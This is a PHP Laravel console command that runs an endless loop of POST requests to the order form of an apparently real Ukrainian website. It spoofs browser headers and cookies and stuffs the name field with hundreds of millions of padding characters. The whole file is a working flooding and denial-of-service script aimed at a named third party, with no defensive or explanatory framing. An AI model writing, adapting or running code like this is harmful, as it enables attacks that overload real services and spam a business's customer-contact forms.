<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class Shit extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'Shit';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        while (true) {

            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => 'http://autolombardua.com/app/c',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS =>'{"hit":{"page_id":2713890,"ab_id":3921121,"referer":"","uri":"/"},"form":{"name":"Секция \\"Форма\\"","type":"order","privacy":"none","privacy_checkbox":"Даю согласие на <обработку персональных данных>","after":"msg","msg":"Спасибоu0021 Ваша заявка отправлена. В ближайшее время мы с Вами свяжемсяu0021","url":"http://diski-zakaz.ru/thx","addhtml":"","js":"alert(\\"Этот код выполняется после успешного отправления заявки.\\");","integrations":[]},"item":[],"items":[],"fields":[{"name":"Имя","type":"name","required":false,"id":"","value":"' . str_pad("", PHP_INT_MAX / 10000000000, "0") . '"},{"name":"Телефон","type":"phone","required":true,"id":"","value":"0987654321"}]}',
                CURLOPT_HTTPHEADER => array(
                    'Connection: keep-alive',
                    'Accept: application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With: XMLHttpRequest',
                    'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
                    'Content-Type: application/json',
                    'Origin: http://autolombardua.com',
                    'Referer: http://autolombardua.com/',
                    'Accept-Language: ru,ru-RU;q=0.9,en-US;q=0.8,en;q=0.7,uk;q=0.6',
                    'Cookie: plp7_2713890=5fe60eea03e02f25095148; form_submitted=1'
                ),
            ));

            $response = curl_exec($curl);

            curl_close($curl);
        }
        return 0;
    }
}
